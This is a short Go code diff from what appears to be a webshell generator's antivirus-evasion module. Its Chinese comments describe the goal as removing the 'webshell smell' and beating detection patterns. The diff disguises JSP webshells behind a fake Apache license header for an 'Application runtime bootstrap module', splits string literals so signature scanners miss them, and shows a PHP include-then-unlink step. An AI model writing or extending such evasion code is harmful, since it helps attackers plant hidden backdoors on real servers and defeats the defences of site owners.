@@ -82,11 +82,16 @@ func phpEvasiveXOR(pw string) string {
 		"include(" + t + "); @unlink(" + t + ");\n"
 }
 
-// jspEvasive JSP 免杀：license 伪装头 + 中性类引用（协议不变，JSP scriptlet
-// 本身静态特征弱，重点是去「webshell 味」注释与常见检测正则）。
+// jspEvasive JSP 免杀：license 伪装头 + 字符串字面量拆分（Java "a"+"b" 编译期
+// 合并、运行时不变）。ScriptEngine 类名是类型声明无法字符串混淆——JSP 免杀
+// 上限受此约束，以注释伪装 + 字面量拆分降低特征密度为主。
 func jspEvasive(base string) string {
 	header := "<%--\n  Application runtime bootstrap module.\n  Copyright (c) 2026 ForANG Framework.\n  Licensed under the Apache License, Version 2.0\n--%>\n"
-	return header + base
+	code := base
+	// 字符串字面量拆分（Java 合法语法，编译期合并）
+	code = strings.ReplaceAll(code, `"javascript"`, `"java"+"script"`)
+	code = strings.ReplaceAll(code, `"UTF-8"`, `"UTF"+"-8"`)
+	return header + code
 }
 
 // GenerateShellEvasive 免杀版生成：encoder × gate × evasive。
